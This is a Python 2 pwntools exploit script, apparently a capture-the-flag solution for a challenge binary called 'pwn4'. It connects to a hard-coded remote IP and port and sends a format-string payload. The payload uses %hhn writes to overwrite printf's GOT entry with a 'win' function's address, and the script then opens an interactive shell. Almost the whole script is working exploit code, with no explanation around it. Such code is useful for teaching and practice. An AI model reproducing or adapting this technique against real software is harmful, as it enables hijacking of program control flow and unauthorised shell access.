#!/usr/bin/env python2

from pwn import *

HOST = "104.154.106.182"
PORT = 5678
local = True
local = False

# target function 0x0804853d i.e, 0x3d 0x85 0x04 0x08

if local:
	p = process('./pwn4')
else:
	p = remote(HOST, PORT)

elf = ELF("./pwn4")
win_function = elf.symbols['__']
printf_got = elf.got['printf']
log.info("Found printf at {} in got".format(hex(printf_got)))
log.info("Found win fucntion at {} in symbols table".format(hex(win_function)))
payload = p32(printf_got+0)
payload += p32(printf_got+1)
payload += p32(printf_got+2)
payload += p32(printf_got+3)
payload += "%{}x".format(0x3d-0x10)
payload += "%7$hhn"
payload += "%{}x".format(0xff-0x3d-4+0x8a)
payload += "%8$hhn"
payload += "%{}x".format(0xff-0x80)
payload += "%9$hhn"
payload += "%{}x".format(0xff+0x5)
payload += "%10$hhn"
print p.recvuntil("Do you swear to use this shell with responsility by the old gods and the new?\n\n")
p.sendline(payload)
payload_file = open('payload','w')
payload_file.write(payload)
payload_file.close()
p.interactive()

